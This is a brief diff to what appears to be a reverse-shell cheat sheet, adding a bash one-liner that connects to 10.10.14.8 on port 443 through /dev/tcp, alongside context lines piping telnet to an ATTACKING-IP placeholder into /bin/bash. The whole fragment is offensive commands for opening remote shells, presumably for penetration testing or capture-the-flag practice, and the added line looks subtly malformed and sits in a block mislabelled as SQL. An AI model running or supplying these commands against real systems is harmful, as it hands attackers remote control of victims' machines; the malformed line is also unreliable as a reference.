@@ -177,6 +177,9 @@ telnet ATTACKING-IP 80 | /bin/bash | telnet ATTACKING-IP 443
 
 
 ## **Bash**
+```sql
+bash -c "bash -i & /dev/tcp/10.10.14.8/443 0>&1"
+```
 
 ```sql
 exec /bin/bash 0&0 2>&0
